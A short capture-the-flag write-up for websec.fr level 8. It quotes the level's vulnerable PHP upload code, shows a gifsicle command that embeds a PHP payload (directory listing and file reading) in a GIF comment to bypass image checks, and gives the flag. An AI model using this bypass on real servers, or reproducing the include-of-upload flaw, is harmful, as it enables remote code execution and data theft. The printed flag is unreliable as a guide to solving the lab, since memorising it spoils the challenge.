# Level 8

1. First, lets check what is written in http://websec.fr/level08/source.php
2. Then we could find the function : 
    ```
    if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
        if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
            move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
            echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
            echo '<pre>';
            include_once($uploadedFile);
            echo '</pre>';
            unlink($uploadedFile);
        } else { echo '<p class="text-danger">The file is not a GIF</p>'; }
    } else { echo '<p class="text-danger">The file is not an image</p>'; }
    ```
    ```
    getimagesize()
    exif_imagetype()
    ```
    These two are used to check if the file is .gif or not, so we have to upload .gif with no doubt.
3. Now, we should think of a way to put scripts in a gif. Since my system is kali, I use the package : 
    ```
    apt-get install gifsicle
    ```
    This allow me to insert php into gif.
4. Then I download a gif (remember to notice the size) and use the command below : 
    ```
    gifsicle < yourgif.gif --comment "<?php print_r(scandir('/'));  show_source('flag.txt'); ?>" > output.php.gif
    ```
    print_r(scandir('/')) is such as "ls" or "dir", so it is only used to check what exactly is the name of the flag. Finally we can get the flag after we upload it.
6. Here is the flag : WEBSEC{BypassingImageChecksToRCE}
